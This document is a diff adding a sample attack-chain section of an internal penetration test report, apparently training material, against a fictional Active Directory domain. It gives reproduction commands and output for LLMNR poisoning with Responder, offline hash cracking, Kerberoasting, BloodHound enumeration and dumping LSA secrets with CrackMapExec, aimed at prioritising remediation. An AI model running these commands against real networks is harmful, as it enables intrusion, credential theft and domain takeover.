@@ -1,0 +1,156 @@
+Sample Attack Chain - INLANEFREIGHT.LOCAL Internal Penetration Test
+During the Internal Penetration Test performed against Inlanefreight, the tester gained a foothold in the internal network, moved laterally, and ultimately compromised the INLANEFREIGHT.LOCAL Active Directory domain. The below walkthrough illustrates the steps taken to go from an unauthenticated anonymous user in the internal network to Domain Admin level access. The intent of this attack chain is to demonstrate to Inlanefreight the impact of each vulnerability shown in this report and how they fit together to demonstrate the overall risk to the client environment and help to prioritize remediation efforts (i.e., patching two flaws quickly could break up the attack chain while the company works to remediate all issues reported). While other findings shown in this report could be leveraged to gain a similar level of access, this attack chain shows the initial path of least resistance taken by the tester to achieve domain compromise.
+
+1. The tester utilized the Responder tool to obtain an NTLMv2 password hash for a domain user, bsmith.
+
+2. This password hash was successfully cracked offline using the Hashcat tool to reveal the user's cleartext password, which granted a foothold into the INLANEFREIGHT.LOCAL domain, but with no more privileges than a standard domain user.
+
+3. The tester then ran the BloodHound.py tool, a Python version of the popular SharpHound collection tool to enumerate the domain and create visual representations of attack paths. Upon review, the tester found that multiple privileged users existed in the domain configured with Service Principal Names (SPNs), which can be leveraged to perform a Kerberoasting attack and retrieve TGS Kerberos tickets for the accounts which can be cracked offline using Hashcat if a weak password is set. From here, the tester used the GetUserSPNs.py tool to carry out a targeted Kerberoasting attack against the mssqlsvc account, having found that the mssqlsvc account had local administrator rights over the host SQL01.INLANEFREIGHT.LOCAL which was an interesting target in the domain.
+
+4. The tester successfully cracked this account's password offline, revealing the cleartext value.
+
+5. The tester authenticated to the host SQL01.INLANEFREIGHT.LOCAL and retrieved a cleartext password from the host's registry by decrypting LSA secrets for an account (srvadmin), which was set up for autologon.
+
+6. This srvadmin account had local administrator rights over all servers (aside from Domain Controllers) in the domain, so the tester logged into the MS01.INLANEFREIGHT.LOCAL host and retrieved a Kerberos TGT ticket for a logged-in user, pramirez. This user was part of the Tier I Server Admins group, which granted the account DCSync rights over the domain object. This attack can be utilized to retrieve the NTLM password hash for any user in the domain, resulting in domain compromise and persistence via a Golden Ticket.
+
+7. The tester used the Rubeus tool to extract the Kerberos TGT ticket for the pramirez user and perform a Pass-the-Ticket attack to authenticate as this user.
+
+8. Finally, the tester performed a DCSync attack after successfully authenticating with this user account via the Mimikatz tool, which ended in domain compromise.
+
+Detailed reproduction steps for this attack chain are as follows:
+Upon connecting to the network, the tester started the Responder tool and was able to capture a password hash for the bsmith user by spoofing NBT-NS/LLMNR traffic on the local network segment.
+
+RESPONDER
+
+MJBUCKNER@htb[/htb]$  sudo responder -I eth0 -wrfv
+
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+ <SNIP>
+
+[+] Generic Options:
+    Responder NIC              [eth0]
+    Responder IP               [192.168.195.168]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-TWWXTGD94CV]
+    Responder Domain Name      [3BKZ.LOCAL]
+    Responder DCE-RPC Port     [47032]
+
+[+] Listening for events...
+
+<SNIP>
+
+[SMB] NTLMv2-SSP Client   : 192.168.195.205
+[SMB] NTLMv2-SSP Username : INLANEFREIGHT\bsmith
+[SMB] NTLMv2-SSP Hash     : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FAAA50000000002000800330042004B005A0001001E00570049004E002D005400570057005800540047004400390034004300560004003400570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D801060004000200000008003000300000000000000001000000002000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100390035002E00310036003800000000000000000000000000
+
+<SNIP>
+
+
+The tester was successful in "cracking" this password hash offline using the Hashcat tool and retrieving the cleartext password value, thus granting a foothold to enumerate the Active Directory domain.
+
+HASHCAT 
+MJBUCKNER@htb[/htb]$ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt 
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a002e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f846a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED>
+
+The tester proceeded to enumerate user accounts configured with Service Principal Names (SPNs) that may be subject to a Keberoasting attack. This lateral movement/privilege escalation technique targets SPNs (unique identifiers that Kerberos uses to map a service instance to a service account). Any domain user can request a Kerberos ticket for any service account in the domain, and the ticket is encrypted with the service account's NTLM password hash, which can potentially be "cracked" offline to reveal the account's cleartext password value.
+
+GetUserSPNs
+MJBUCKNER@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204
+
+Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                         Name       MemberOf  PasswordLastSet             LastLogon  Delegation 
+-------------------------------------------  ---------  --------  --------------------------  ---------  ----------
+MSSQLSvc/SQL01.inlanefreight.local:1433      mssqlsvc             2022-05-13 16:52:07.280623  <never>               
+MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod              2022-05-13 16:54:52.889815  <never>               
+MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev               2022-05-13 16:54:57.905315  <never>               
+MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                2022-05-13 16:55:03.421004  <never>               
+backupjob/veam001.inlanefreight.local        backupjob            2022-05-13 18:38:17.740269  <never>               
+vmware/vc.inlanefreight.local                vmwaresvc            2022-05-13 18:39:10.691799  <never> 
+
+The tester then ran the Python version of the popular BloodHound Active Directory enumeration tool to collect information such as users, groups, computers, ACLs, group membership, user and computer properties, user sessions, local admin access, and more. This data can then be imported into a GUI tool to create visual representations of relationships within the domain and map out "attack paths" that can be used to potentially move laterally or escalate privileges within a domain.
+
+Bloodhound
+MJBUCKNER@htb[/htb]$ sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All
+
+INFO: Found AD domain: inlanefreight.local
+INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 503 computers
+INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
+INFO: Found 652 users
+
+<SNIP>
+
+The tester used this tool to check privileges for each of the SPN accounts enumerated in previous steps and noticed that only the mssqlsvc account had any privileges beyond a standard domain user. This account had local administrator access over the SQL01 host. SQL servers are often high-value targets in a domain as they hold privileged credentials, sensitive data, or may even have a more privileged user logged in.
+
+
+The tester then performed a targeted Kerberoasting attack to retrieve the Kerberos TGS ticket for the mssqlsvc service account.
+
+GetUserSPNs
+MJBUCKNER@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc
+
+Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                     Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
+---------------------------------------  --------  --------  --------------------------  ---------  ----------
+MSSQLSvc/SQL01.inlanefreight.local:1433  mssqlsvc            2022-05-13 16:52:07.280623  <never>               
+
+$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a3988485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c44ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf68286ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a897185716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP>
+
+
+The tester was successful in "cracking" this password offline to reveal its cleartext value.
+
+Hashcat
+MJBUCKNER@htb[/htb]$ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt 
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a<SNIP>:<REDACTED>
+
+This password could be used to access the SQL01 host remotely and retrieve a set of cleartext credentials from the registry for the srvadmin account.
+
+CrackMapExec
+MJBUCKNER@htb[/htb]$ crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa
+
+SMB         192.168.195.220 445    SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         192.168.195.220 445    SQL01            [+] INLANEFREIGHT.LOCAL\mssqlsvc:<REDACTED> 
+SMB         192.168.195.220 445    SQL01            [+] Dumping LSA secrets
+SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7bd0f186CCCCC450c5e8cb53228cc0
+SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/srvadmin:$DCC2$10240#srvadmin#ef393703f3fabCCCCCa547caffff5f
+
+<SNIP>
+
+SMB         192.168.195.220 445    SQL01            INLANEFREIGHT\srvadmin:<REDACTED>
+
+<SNIP>
+
+SMB         192.168.195.220 445    SQL01            [+] Dumped 10 LSA secrets to /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.secrets and /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.cached
+
+
